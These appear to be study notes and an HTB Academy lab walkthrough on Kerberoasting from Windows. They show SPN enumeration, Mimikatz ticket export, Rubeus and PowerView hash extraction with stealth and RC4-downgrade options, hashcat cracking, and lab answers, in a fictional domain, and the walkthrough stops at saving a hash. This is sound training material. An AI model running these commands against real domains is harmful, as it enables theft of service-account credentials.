# Kerberoasting - from Windows

## 📋 Overview

Kerberoasting from Windows provides multiple approaches ranging from manual techniques using built-in tools to automated methods with specialized frameworks. Windows-based Kerberoasting offers advantages including native tool integration, direct memory manipulation capabilities, and access to powerful enumeration frameworks like PowerView and Rubeus. Understanding both manual and automated approaches ensures versatility across different engagement scenarios and defensive controls.

## 🎯 Strategic Context

### 🔧 **Windows vs Linux Kerberoasting**
- **Native Integration**: Direct access to Windows AD tools and PowerShell frameworks
- **Memory Manipulation**: Ability to extract tickets directly from LSASS memory
- **Tool Diversity**: Multiple approaches from manual to fully automated
- **Stealth Options**: Built-in tools blend with legitimate administrative activity
- **Advanced Features**: Encryption type manipulation and ticket caching capabilities

### ⚡ **Attack Scenarios**
- **Domain-joined Windows host**: Authenticated as domain user
- **Windows attack host**: Non-domain joined with domain credentials
- **Compromised workstation**: Local admin or SYSTEM privileges
- **Administrative access**: Domain admin performing "legitimate" activities
- **Restricted environments**: When external tools are blocked or monitored

---

## 🔧 Semi-Manual Kerberoasting Method

### 📊 **Phase 1: SPN Enumeration with setspn.exe**
```cmd
# Enumerate all SPNs in the domain
setspn.exe -Q */*

# Target specific service types
setspn.exe -Q */MSSQL*
setspn.exe -Q */HTTP*
setspn.exe -Q */LDAP*

# Enumerate SPNs for specific domain
setspn.exe -T INLANEFREIGHT.LOCAL -Q */*
```

**Example SPN Enumeration Output:**
```cmd
C:\htb> setspn.exe -Q */*

Checking domain DC=INLANEFREIGHT,DC=LOCAL
CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
        exchangeAB/ACADEMY-EA-DC01
        exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        TERMSRV/ACADEMY-EA-DC01
        TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL

CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        backupjob/veam001.inlanefreight.local
CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        sts/inlanefreight.local
CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SPSJDB.inlanefreight.local:1433
CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        adfsconnect/azure01.inlanefreight.local
```

### 🎫 **Phase 2: Manual TGS Ticket Request via PowerShell**
```powershell
# Load the required .NET framework class
Add-Type -AssemblyName System.IdentityModel

# Request TGS ticket for specific SPN (loads into memory)
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Request tickets for all SPNs (automated approach)
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

**Understanding the PowerShell Commands:**
- **Add-Type -AssemblyName System.IdentityModel**: Loads .NET framework class for security tokens
- **System.IdentityModel.Tokens.KerberosRequestorSecurityToken**: Creates Kerberos TGS ticket requests
- **-ArgumentList**: Specifies the target SPN for ticket request
- **Tickets loaded into memory**: Available for extraction with Mimikatz

**Example TGS Ticket Request Output:**
```powershell
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:36:22 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

### 💾 **Phase 3: Ticket Extraction with Mimikatz**
```cmd
# Start Mimikatz
mimikatz.exe

# Enable base64 output for easier handling
mimikatz # base64 /out:true

# Extract and export all Kerberos tickets from memory
mimikatz # kerberos::list /export

# Alternative: Extract without base64 encoding (creates .kirbi files)
mimikatz # kerberos::list /export
```

**Example Mimikatz Extraction:**
```cmd
mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export

[00000002] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
   Client Name       : htb-student @ INLANEFREIGHT.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 

====================
Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
====================
doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO
RUZSRUlHSFQuTE9DQUyiOzA5oAMCAQKhMjAwGwhNU1NRTFN2YxskREVWLVBSRS1T
[... BASE64 BLOB CONTINUES ...]
```

### 🔄 **Phase 4: Ticket Processing for Hashcat**
```bash
# Remove newlines and whitespace from base64 blob
echo "<base64 blob>" | tr -d \\n

# Save cleaned base64 to file and decode
cat encoded_file | base64 -d > sqldev.kirbi

# Convert kirbi to john format
python2.7 kirbi2john.py sqldev.kirbi

# Modify for Hashcat compatibility
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# Verify hash format
cat sqldev_tgs_hashcat
```

**Expected Hash Format:**
```bash
$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55efeba9d77e4c6c6f524afee5c68dacfcb6607291a20cdfb0ef144055356a7296e33b440754be7f87754ac2e4858348e2aebb7270b2d345047f880e17acc07e27a8f752c372bc83a62d54208d12288893d32afd210191dd3b2c56797bd1a72e35a73a7820be51fbf277b83d8181fff5a05cf21481a7b462ceb01c3761c50952689ed1099827c17c2934131db71bc5142c589cd70ed2ebf57dca3f6226f3b21849529355414433210b8d7bd76fec4eb68a45deebc3e7cc931ed8769328536769123f5040d6771915cdbc6c90164669fac72d23a631fef25804b5c8ec39680a4cc2959929edce34bbee6aff135bcbbb26a41a4b4e88b936896d4662ac849f56d7d68071be139cf4dfaf66497015297f9b44cdaef096c8d00255ec3e62f7105d905d0b2f39cef83db4d812718f95e8c99129f3207b386b4c32f7d57befd411e19c218148d19028eb0103d6be99ae23a454f6f3b0339d00d27879f342598937596cadad068ac3d815952a053f87d87b2584784b9d83050eea9a7c6474cde26c90f4a3546076a40ed374d004c465f654623499ca14e9c11538012cf00dee315e2ed444293822502d7f685022e61f3568e1db25b5cfe5a89b33878b6e3db05e9d91ad63820fcb7d0449e66add13f1efceddda95339db3dc919f1caff9690e54b3e4f9a8cf6998a9f9bf55c7a2ed2c87382e9da60f7ca3c22e08cc359f3ef6f4603a5af2fc28303bf3602ab9bc52026e58c27fb247fd4210f45244fd71484685b837fe9573a53964d54acfde7f963028764e99bea7b77139cb651328e862e43d894638288eace99b6d4f8b6684150db9adc43254143b77f32ebe6fbe309dde3b78305fdf0fe60505f9000b89c67c75ef6dd425e04fbe3a5ebf2d78a11a392d815a29ef48d9457fb6c780eb4cc07dfa68c2e97054788952f5ad92ca8d062e4a68967860302fd9630174af832e599bb5fca9cf341d7a1176868d9073796dffbd48efe99b222f4274e93066de646b3c60d1dd94072dd121dd0706024d11738a75ebeb5b7865a5505220d0f03aea6d359a17f3c5b6424989b31b6e52d1c558393aa34e81204fb107374a8884dcb16f6c59a76a0022004fd921734b8719e8694ba0d7f87eb46f5607af4eb1c681b6b5140dbc94a9ea7f5db6ae4c71fbc1024a25b77ac00bdc549d66373d390643be8f1007930a4124e99d4fcb6177dbd5669fb06170d3b8a75db9928164b55e454d08e77f917b1dd2e648d9c7eb0cb2b8ca0eff8a44d1ea5fdd67e01da79047a4a1406f761f5e3b6944cebed45379ea14e7a027c843fa405c07c8385a2102f07967a7cb4883f44ee72d4aa7a38b2701e77374016a01193f5b178e34f4cf2d8eadf651e162569eb421c74e8d5e0cc1a9fab58a4b9b63babb09efc3427e1667f9c7731bcabe3645986040a7306924df5e6e68655e7b0e2e88e7ce0281e0f554de82d9de6c4d9c8d2a36fce65bbb337a415030ce1d03c00fd9783afb5df0ee8fbabfa358521ad845e6d07fde7d34f2311ebae6e6a119d60d899467a66f997c273d2df73350f2d6c5438e71a057feeab
```

### 🔐 **Phase 5: Offline Cracking**
```bash
# Crack with Hashcat (mode 13100 for Kerberos 5 TGS-REP)
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt

# Result: Password cracked as "database!"
```

---

## ⚡ Automated PowerView Method

### 🔍 **SPN Enumeration with PowerView**
```powershell
# Import PowerView module
Import-Module .\PowerView.ps1

# Enumerate all users with SPNs
Get-DomainUser * -spn | select samaccountname

# Get detailed SPN information
Get-DomainUser * -spn | select samaccountname,serviceprincipalname,memberof
```

**Example PowerView SPN Output:**
```powershell
PS C:\htb> Get-DomainUser * -spn | select samaccountname

samaccountname
--------------
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor
```

### 🎫 **Targeted Ticket Extraction**
```powershell
# Target specific user and get ticket in Hashcat format
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Export all tickets to CSV file
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

# View CSV contents
cat .\ilfreight_tgs.csv
```

**Example Targeted Ticket Output:**
```powershell
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

SamAccountName       : sqldev
DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433*$BF9729001376B63C5CAC933493C58CE7$4029DBBA2566AB4748EDB609CA47A6E7F6E0C10AF50B02D10A6F92349DDE3336018DE177AB4FF3CE724FB0809CDA9E30703EDDE93706891BCF094FE64387B8A32771C7653D5CFB7A70DE0E45FF7ED6014B5F769FDC690870416F3866A9912F7374AE1913D83C14AB51E74F200754C011BD11932464BEDA7F1841CCCE6873EBF0EC5215C012E1938AEC0E02229F4C707D333BD3F33642172A204054F1D7045AF3303809A3178DD7F3D8C4FB0FBB0BB412F3BD55267B1F55879DFB74E2E5D976C4578501E1B8F8484A0E972E8C45F7294DA90581D981B0F177D79759A5E6282D86217A03A9ADBE5EEB35F3924C84AE22BBF4548D2164477409C5449C61D68E95145DA5456C548796CC30F7D3DDD80C48C84E3A538B019FB5F6F34B13859613A6132C90B2387F0156F3C3C45590BBC2863A3A042A04507B88FD752505379C42F32A14CB9E44741E73285052B70C1CE5FF39F894412010BAB8695C8A9BEABC585FC207478CD91AE0AD03037E381C48118F0B65D25847B3168A1639AF2A534A63CF1BC9B1AF3BEBB4C5B7C87602EEA73426406C3A0783E189795DC9E1313798C370FD39DA53DDCFF32A45E08D0E88BC69601E71B6BD0B753A10C36DB32A6C9D22F90356E7CD7D768ED484B9558757DE751768C99A64D650CA4811D719FC1790BAE8FE5DB0EB24E41FF945A0F2C80B4C87792CA880DF9769ABA2E87A1ECBF416641791E6A762BF1DCA96DDE99D947B49B8E3DA02C8B35AE3B864531EC5EE08AC71870897888F7C2308CD8D6B820FCEA6F584D1781512AC089BFEFB3AD93705FDBA1EB070378ABC557FEA0A61CD3CB80888E33C16340344480B4694C6962F66CB7636739EBABED7CB052E0EAE3D7BEBB1E7F6CF197798FD3F3EF7D5DCD10CCF9B4AB082CB1E199436F3F271E6FA3041EF00D421F4792A0ADCF770B13EDE5BB6D4B3492E42CCCF208873C5D4FD571F32C4B761116664D9BADF425676125F6BF6C049DD067437858D0866BE520A2EBFEA077037A59384A825E6AAA99F895A58A53313A86C58D1AA803731A849AE7BAAB37F4380152F79045637237582F4CA1C5287F39986BB233A34773102CB4EAE80AFFFFEA7B4DCD54C28A824FF225EA336DE28F4141962E21410D66C5F63920FB1434F87A988C52604286DDAD536DA58F80C4B92858FE8B5FFC19DE1B017295134DFBE8A2A6C74CB46FFA7762D64399C7E009AA60B8313C12D192AA25D3025CD0B0F81F7D94249B60E29F683B797493C8C2B9CE61B6E3636034E6DF231C428B4290D1BD32BFE7DC6E7C1E0E30974E0620AE337875A54E4AFF4FD50C4785ADDD59095411B4D94A094E87E6879C36945B424A86159F1575042CB4998F490E6C1BC8A622FC88574EB2CF80DD01A0B8F19D8F4A67C942D08DCCF23DD92949F63D3B32817941A4B9F655A1D4C5F74896E2937F13C9BAF6A81B7EEA3F7BC7C192BAE65484E5FCCBEE6DC51ED9F05864719357F2A223A4C48A9A962C1A90720BBF92A5C9EEB9AC1852BC3A7B8B1186C7BAA063EB0AA90276B5D91AA2495D29D545809B04EE67D06B017C6D63A261419E2E191FB7A737F3A08A2E3291AB09F95C649B5A71C5C45243D4CEFEF5EED95DDD138C67495BDC772CFAC1B8EF37A1AFBAA0B73268D2CDB1A71778B57B02DC02628AF11
```

---

## 🚀 Rubeus: The Ultimate Kerberoasting Tool

### 📚 **Rubeus Overview and Capabilities**
```cmd
# Display full help menu
.\Rubeus.exe

# Key Kerberoasting functions:
# - Basic Kerberoasting with various filters
# - Output to files in different formats
# - Encryption type manipulation
# - Statistical analysis
# - Advanced LDAP filtering
# - Timing controls for stealth
```

### 📊 **Statistical Analysis with Rubeus**
```cmd
# Gather statistics without requesting tickets
.\Rubeus.exe kerberoast /stats

# Analyze encryption types and password ages
.\Rubeus.exe kerberoast /stats /nowrap
```

**Example Statistics Output:**
```cmd
PS C:\htb> .\Rubeus.exe kerberoast /stats

[*] Action: Kerberoasting
[*] Listing statistics about target users, no ticket requests being performed.
[*] Target Domain          : INLANEFREIGHT.LOCAL

[*] Total kerberoastable users : 9

 ------------------------------------------------------------
 | Supported Encryption Type                        | Count |
 ------------------------------------------------------------
 | RC4_HMAC_DEFAULT                                 | 7     |
 | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 2     |
 ------------------------------------------------------------

 ----------------------------------
 | Password Last Set Year | Count |
 ----------------------------------
 | 2022                   | 9     |
 ----------------------------------
```

### 🎯 **Targeted High-Value Account Extraction**
```cmd
# Target accounts with admincount=1 (high-privilege accounts)
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Target accounts with passwords set in specific date range
.\Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 /nowrap

# Target specific organizational unit
.\Rubeus.exe kerberoast /ou:"OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL" /nowrap

# Save tickets to file
.\Rubeus.exe kerberoast /outfile:tickets.txt /nowrap
```

**Example High-Value Target Output:**
```cmd
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

[*] Action: Kerberoasting
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(admincount=1))'

[*] Total kerberoastable users : 3

[*] SamAccountName         : backupagent
[*] DistinguishedName      : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : backupjob/veam001.inlanefreight.local
[*] PwdLastSet             : 2/15/2022 2:15:40 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*backupagent$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local@INLANEFREIGHT.LOCAL*$750F377DEFA85A67EA0FE51B0B28F83D$049EE7BF77ABC968169E1DD9E31B8249F509080C1AE6C8575B7E5A71995F345CB583FECC68050445FDBB9BAAA83AC7D553EECC57286F1B1E86CD16CB3266827E2BE2A151EC5845DCC59DA1A39C1BA3784BA8502A4340A90AB1F8D4869318FB0B2BEC2C8B6C688BD78BBF6D58B1E0A0B980826842165B0D88EAB7009353ACC9AD4FE32811101020456356360408BAD166B86DBE6AEB3909DEAE597F8C41A9E4148BD80CFF65A4C04666A977720B954610952AC19EDF32D73B760315FA64ED301947142438B8BCD4D457976987C3809C3320725A708D83151BA0BFF651DFD7168001F0B095B953CBC5FC3563656DF68B61199D04E8DC5AB34249F4583C25AC48FF182AB97D0BF1DE0ED02C286B42C8DF29DA23995DEF13398ACBE821221E8B914F66399CB8A525078110B38D9CC466EE9C7F52B1E54E1E23B48875E4E4F1D35AEA9FBB1ABF1CF1998304A8D90909173C25AE4C466C43886A650A460CE58205FE3572C2BF3C8E39E965D6FD98BF1B8B5D09339CBD49211375AE612978325C7A793EC8ECE71AA34FFEE9BF9BBB2B432ACBDA6777279C3B93D22E83C7D7DCA6ABB46E8CDE1B8E12FE8DECCD48EC5AEA0219DE26C222C808D5ACD2B6BAA35CBFFCD260AE05EFD347EC48213F7BC7BA567FD229A121C4309941AE5A04A183FA1B0914ED532E24344B1F4435EA46C3C72C68274944C4C6D4411E184DF3FE25D49FB5B85F5653AD00D46E291325C5835003C79656B2D85D092DFD83EED3ABA15CE3FD3B0FB2CF7F7DFF265C66004B634B3C5ABFB55421F563FFFC1ADA35DD3CB22063C9DDC163FD101BA03350F3110DD5CAFD6038585B45AC1D482559C7A9E3E690F23DDE5C343C3217707E4E184886D59C677252C04AB3A3FB0D3DD3C3767BE3AE9038D1C48773F986BFEBFA8F38D97B2950F915F536E16E65E2BF67AF6F4402A4A862ED09630A8B9BA4F5B2ACCE568514FDDF90E155E07A5813948ED00676817FC9971759A30654460C5DF4605EE5A92D9DDD3769F83D766898AC5FC7885B6685F36D3E2C07C6B9B2414C11900FAA3344E4F7F7CA4BF7C76A34F01E508BC2C1E6FF0D63AACD869BFAB712E1E654C4823445C6BA447463D48C573F50C542701C68D7DBEEE60C1CFD437EE87CE86149CDC44872589E45B7F9EB68D8E02070E06D8CB8270699D9F6EEDDF45F522E9DBED6D459915420BBCF4EA15FE81EEC162311DB8F581C3C2005600A3C0BC3E16A5BEF00EEA13B97DF8CFD7DF57E43B019AF341E54159123FCEDA80774D9C091F22F95310EA60165C805FED3601B33DA2AFC048DEF4CCCD234CFD418437601FA5049F669FEFD07087606BAE01D88137C994E228796A55675520AB252E900C4269B0CCA3ACE8790407980723D8570F244FE01885B471BF5AC3E3626A357D9FF252FF2635567B49E838D34E0169BDD4D3565534197C40072074ACA51DB81B71E31192DB29A710412B859FA55C0F41928529F27A6E67E19BE8A6864F4BC456D3856327A269EF0D1E9B79457E63D0CCFB5862B23037C74B021A0CDCA80B43024A4C89C8B1C622A626DE5FB1F99C9B41749DDAA0B6DF9917E8F7ABDA731044CF0E989A4A062319784D11E2B43554E329887BF7B3AD1F3A10158659BF48F9D364D55F2C8B19408C54737AB1A6DFE92C2BAEA9E
```

### 🎯 **Advanced Rubeus Features**
```cmd
# OPSEC-conscious Kerberoasting (filters AES-enabled accounts)
.\Rubeus.exe kerberoast /rc4opsec /nowrap

# Kerberoasting with timing controls (stealth)
.\Rubeus.exe kerberoast /delay:5000 /jitter:30 /nowrap

# Force RC4 encryption using tgtdeleg technique
.\Rubeus.exe kerberoast /tgtdeleg /nowrap

# AES Kerberoasting (when RC4 is disabled)
.\Rubeus.exe kerberoast /aes /nowrap

# Use alternate credentials
.\Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD /nowrap
```

---

## 🔐 Encryption Types Analysis

### 📊 **Understanding Kerberos Encryption Types**

| **Type** | **Encryption** | **Hashcat Mode** | **Cracking Difficulty** | **Hash Format** |
|----------|----------------|------------------|--------------------------|-----------------|
| **23** | RC4_HMAC_MD5 | 13100 | Easy/Fast | `$krb5tgs$23$*` |
| **17** | AES128_CTS_HMAC_SHA1_96 | 19600 | Hard/Slow | `$krb5tgs$17$*` |
| **18** | AES256_CTS_HMAC_SHA1_96 | 19700 | Very Hard/Very Slow | `$krb5tgs$18$*` |

### ⚡ **RC4 vs AES Performance Comparison**

#### **RC4 Cracking Example:**
```bash
# RC4 hash cracking (fast)
hashcat -m 13100 rc4_ticket.txt /usr/share/wordlists/rockyou.txt

# Result: 4 seconds on CPU
# Hash: $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*$CEA71B221FC2C00F8886261660536CC1$...:welcome1$

Time.Started.....: Sun Feb 27 15:36:58 2022 (4 secs)
Time.Estimated...: Sun Feb 27 15:37:02 2022 (0 secs)
Speed.#1.........:   693.3 kH/s
```

#### **AES256 Cracking Example:**
```bash
# AES256 hash cracking (slow)
hashcat -m 19700 aes_ticket.txt /usr/share/wordlists/rockyou.txt

# Result: 4 minutes 36 seconds on CPU
# Hash: $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$8939f8c5b97a4caa170ad706$...:welcome1$

Time.Started.....: Sun Feb 27 16:07:50 2022 (4 mins, 36 secs)
Time.Estimated...: Sun Feb 27 16:12:26 2022 (0 secs)
Speed.#1.........:    10114 H/s
```

### 🔄 **Encryption Type Downgrade Attack**
```cmd
# Check current encryption support
Get-DomainUser testspn -Properties msds-supportedencryptiontypes

# Values meaning:
# 0  = RC4_HMAC_MD5 (default)
# 24 = AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96

# Force RC4 tickets even for AES-enabled accounts (Server 2016 and earlier)
.\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap

# Note: This downgrade does NOT work on Windows Server 2019 DCs
```

**msDS-SupportedEncryptionTypes Values:**
```powershell
# Check encryption types
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.inlanefreight.local                            0 testspn      # RC4 only
testspn/kerberoast.inlanefreight.local                           24 testspn      # AES 128/256
```

---

## 🎯 HTB Academy Lab Solutions

### 📝 **Lab Questions & Solutions**

#### 🔍 **Question 1: "What is the name of the service account with the SPN 'vmware/inlanefreight.local'?"**

**Complete Lab Workflow:**
```bash
# Step 1: Connect to target machine via RDP
xfreerdp /v:10.129.149.107 /u:htb-student /p:Academy_student_AD!
# Click "OK" on Computer Access Policy prompt
# Close Server Manager
# Run PowerShell as Administrator
```

**Solution Process:**
```powershell
# Method 1: Direct SPN search with pattern matching (RECOMMENDED)
setspn.exe -Q */* | Select-String -Pattern "vmware/inlanefreight.local" -Context 1

# Method 2: Basic setspn search
setspn.exe -Q vmware/inlanefreight.local

# Method 3: Using PowerView (if available)
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | Where-Object {$_.serviceprincipalname -like "*vmware*"}
```

**Actual Lab Output:**
```powershell
PS C:\Windows\system32> .\setspn.exe -Q */* | Select-String -Pattern "vmware/inlanefreight.local" -Context 1

  CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
>       vmware/inlanefreight.local
```

**✅ Answer: `svc_vmwaresso`**

#### 🔐 **Question 2: "Crack the password for this account and submit it as your answer."**

**Complete Attack Chain (using same RDP session):**

**Step 1: Navigate to Tools Directory**
```powershell
# From the same PowerShell session
cd C:\Tools\
```

**Step 2: Extract Kerberos Ticket with Rubeus**
```powershell
# Use Rubeus to extract ticket for svc_vmwaresso account
.\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap
```

**Actual Rubeus Output:**
```powershell
PS C:\Tools> .\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Kerberoasting
[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : svc_vmwaresso
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=svc_vmwaresso)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : svc_vmwaresso
[*] DistinguishedName      : CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : vmware/inlanefreight.local
[*] PwdLastSet             : 4/5/2022 12:32:46 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local@INLANEFREIGHT.LOCAL*$6F5B30F5AEF2CC451EF05F858D22A0C7$528519E555FD635CCE1FC3F60EDFF8249918716226B5F6BC3F7DB5239FE865A3607A962027CCB25446D108FE0978E1671CD9E4490C83DA4A5B0E7CCA4F2638E8E3C6C4E9FCF82A89B68D62618C4CE23E6210A5483D940D8E9924D6AF7A6D1173D5C773366E377E95A0EFE852FECC41831740F334B1AF96EFA980CD5DCB06ED4C4D7AFCE055E2055A16C3C40291F96CCC362CC3664237FFB1FB94160988A69BB07C68984EA94C8F54A76E4DE3FB77A8FCC85AF4AEF0C5BF549865E4E6054BC93F302CEF7B4AC8E453A8D68FBB3C3EF147830E0F9B50897CE5E18B6DD0D51F027F4F01AFFEF7F76FC51241143E9EF62782A98F77DBEE985F45C0B865946F9D27BD15B83E98781A17A934C68AE3A3E8F419FC9F7DFF049FF78DCD44F0C96757E3AC2EE5E34D5CC377AFD42E32D295C8C10804515B27D89E38DEED49F2854ABDDD01EB8B270A19F6AF4CC76C1A4D8101B771A43FA30CDC5399CDD10046090863383A82AF3A8C0D90B0D31BB89FF1B19956149C3D3C3DC4099B318F360DCF65337A8B291FC0B8A0A03B1CB12F3BB4C67D090BF8B16BF3C9EF5E70B7E714722FA65BC562D0F5737F50E1BA8F79C881B8ECC73129930A9D37DB8F339139DD8F9C26DBFDAF7C94A2F448C5251F243B4492C943A0FCA48B63A3DE244824CBF9607380869BD09ED400DB5E0AFC40699D6DE91C975EBCBC1BA8460361A79CA0BD39BE2974C4A8C44BD077D13E799A8CEE3D0136C183933EBEF4D11ADD28452C40593CBE3F56ED512826FAED80287EB643E7929E30E4813698E3F63CA794BAAAEC1DF832B60F9CA32A559C14F1F02EAD2A0C0191573E4BB2FBBB57CFA49AF073A9A2F67DD3C21026DDE9E10792D0CE091154365F808FF8A4C3D9E0FB8734B556C96C6BCB466C34832368C74955C4B8093CD593C51D491467818644AE8B1F30BD49529C489A9837BF80B18F3DC56E535553320250E3658F4814DD4F5E4780A526103857FDD95B386A820173CAE7217C7B3B88A3518DDECA172E2B665734DB079142717FBCAA1EC447312ECA0D4F5A17613364636C182C6BC316BDAAFB6C5B38020EA8A1CB2383FE884CB97808FF1FD1413F3871A8119D79095C47B309685E74915737E58FD8BB6D1E98A1344758CFFB20163D3A5E0FD414079657CE39C2751195D0E225714C6126E13C16E71731C610F42408B17623452C7C912EC1D738E6462463401A62629474F98FB0E0CB4B15082DA6DAB92A349907CC370BFD1EE7A3A7369287B6E33A05D141EE11B4539060622FD795B2E5F8AE687AB57FACD420475E251F7BFAE7EA1789033BA1B4D91F8FBB60A2EBB6917DF0B2E41FECC429A533983995CF5627C259FF0E4AE3C6ECD7574A94E32719E5BCD364D1EE7AD37DF688EFCE9F1D91371A86E6264D4CD776884389448EE2DAD1CDDC0B1390ECFC6EFCE6895838B0A7EC807AEAC52D422E284B6514A91D5721F9B22A6956FE8ACC76BC7FF89FB1C343B6EEDF17EAFBD1DFB4AC46518CFB9B16364639049356C6F3F1D56676B7B6358CF8AF21F0632B01DED739FF2F42B4C36BF87790E505C7CCD618A480EFE45485E5C4E253567E4206AB132180F1A5DF143097CE23D3C6CD05CAED17CFFFFF50F20FDAE44A3A445B781109B6EC012DD3FC4B885555FCF932BD13616FCA61
```

**Step 3: Save Hash and Crack on Attack Machine**
```bash
# Save the hash to a file (copy from Rubeus output)
